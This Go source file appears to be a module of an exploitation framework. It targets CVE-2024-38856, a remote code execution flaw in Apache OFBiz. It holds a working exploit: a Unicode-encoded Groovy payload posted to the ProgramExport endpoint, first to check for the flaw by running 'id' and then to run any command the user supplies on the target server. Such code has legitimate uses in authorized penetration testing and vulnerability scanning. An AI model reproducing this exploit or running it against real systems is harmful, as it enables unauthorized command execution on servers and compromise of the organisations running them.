package vul

import (
	"appsploit/pkg/utils"
	appVul "appsploit/pkg/vul"
	"fmt"
	"github.com/urfave/cli/v2"
	"strings"
)

type CVE_2024_38856 struct {
	appVul.BaseVulnerability
}

var CVE_2024_38856_v1 = CVE_2024_38856{
	BaseVulnerability: appVul.BaseVulnerability{
		Name:        "CVE-2024-38856",
		Description: "Apache OFBiz RCE - Type: RCE",
	},
}

func (cve CVE_2024_38856) CheckSec(ctx *cli.Context) (bool, error) {
	baseURL := utils.Http.FormatURL(ctx)
	httpClient := *utils.Http.Client()
	httpClient.SetHeader("Content-Type", "application/x-www-form-urlencoded")
	command := utils.Common.EncodeToUnicode("throw new Exception('id'.execute().text);")
	body := fmt.Sprintf("groovyProgram=%s", command)
	if resp, err := httpClient.SetBody(body).Post(baseURL + "/webtools/control/main/ProgramExport"); err != nil {
		return false, err
	} else {
		if strings.Contains(string(resp.Body()), "uid=") && strings.Contains(string(resp.Body()), "gid=") {
			CVE_2024_38856_v1.VulnerabilityExists = true
			CVE_2024_38856_v1.VulnerabilityResponse = "vulnerability is exists"
		} else {
			CVE_2024_38856_v1.VulnerabilityExists = false
		}
	}
	return CVE_2024_38856_v1.VulnerabilityExists, error(nil)
}

func (cve CVE_2024_38856) Exploit(ctx *cli.Context) (bool, error) {
	baseURL := utils.Http.FormatURL(ctx)
	if vulnerabilityExists, err := cve.CheckSec(ctx); err != nil {
		return CVE_2024_38856_v1.VulnerabilityExists, err
	} else {
		if vulnerabilityExists {
			httpClient := *utils.Http.Client()
			httpClient.SetHeader("Content-Type", "application/x-www-form-urlencoded")
			command := utils.Common.EncodeToUnicode(fmt.Sprintf("throw new Exception('%s'.execute().text);", ctx.String("command")))
			body := fmt.Sprintf("groovyProgram=%s", command)
			if resp, err := httpClient.SetBody(body).Post(baseURL + "/webtools/control/main/ProgramExport"); err != nil {
				CVE_2024_38856_v1.VulnerabilityExists = false
				return CVE_2024_38856_v1.VulnerabilityExists, err
			} else {
				CVE_2024_38856_v1.VulnerabilityResponse = resp.String()
			}
		}
	}
	return CVE_2024_38856_v1.VulnerabilityExists, error(nil)
}
